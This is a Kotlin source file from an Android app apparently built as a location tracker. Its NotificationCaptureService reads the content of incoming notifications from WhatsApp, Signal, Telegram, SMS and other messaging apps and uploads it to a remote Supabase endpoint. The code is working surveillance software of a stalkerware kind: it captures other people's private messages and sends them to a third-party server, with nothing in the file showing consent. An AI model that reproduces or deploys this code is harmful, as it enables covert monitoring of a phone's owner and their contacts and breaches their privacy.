package com.snehalit.locationtracker

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.content.Context
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class NotificationCaptureService : NotificationListenerService() {

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val prefs = applicationContext.getSharedPreferences("tracker", Context.MODE_PRIVATE)
        val phone = prefs.getString("phone", "") ?: ""
        if (phone.isBlank()) return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return

        val title = extras.getString("android.title") ?: ""
        val text = extras.getString("android.text") ?: ""
        val subText = extras.getString("android.subText") ?: ""
        val pkg = sbn.packageName

        // Skip system packages and our own app
        val skipPackages = listOf("android", "com.android.systemui", "com.google.android.gms",
            "com.android.phone", "com.android.settings", packageName)
        if (pkg in skipPackages) return

        if (text.isBlank() && title.isBlank()) return

        val body = buildString {
            if (title.isNotBlank()) append("[$title] ")
            append(text)
            if (subText.isNotBlank()) append(" ($subText)")
        }.trim()

        if (body.isBlank()) return

        val source = when {
            pkg.contains("whatsapp") -> "whatsapp"
            pkg.contains("telegram") -> "telegram"
            pkg.contains("messenger") -> "messenger"
            pkg.contains("signal") -> "signal"
            pkg.contains("discord") -> "discord"
            pkg.contains("instagram") -> "instagram"
            pkg.contains("messages") || pkg.contains("sms") -> "sms"
            else -> "notification"
        }

        val msg = JSONObject().apply {
            put("body", body)
            put("address", title)
            put("type", "inbox")
            put("source", "$source:$pkg")
            put("timestamp", java.time.Instant.now().toString())
        }

        Thread {
            try {
                val messages = JSONArray().put(msg)
                val json = JSONObject().apply {
                    put("phone", phone)
                    put("messages", messages)
                }
                val reqBody = json.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url(LocationService.SUPABASE_FUNCTION_URL.replace("push-location", "push-messages"))
                    .post(reqBody)
                    .addHeader("Content-Type", "application/json")
                    .addHeader("Authorization", "Bearer " + LocationService.SUPABASE_ANON_KEY)
                    .build()
                client.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        android.util.Log.w("NotificationCapture", "Upload failed: " + response.body?.string())
                    }
                }
            } catch (e: Exception) {
                android.util.Log.e("NotificationCapture", "Error", e)
            }
        }.start()
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {}

    override fun onListenerConnected() {
        android.util.Log.d("NotificationCapture", "Listener connected")
    }
}
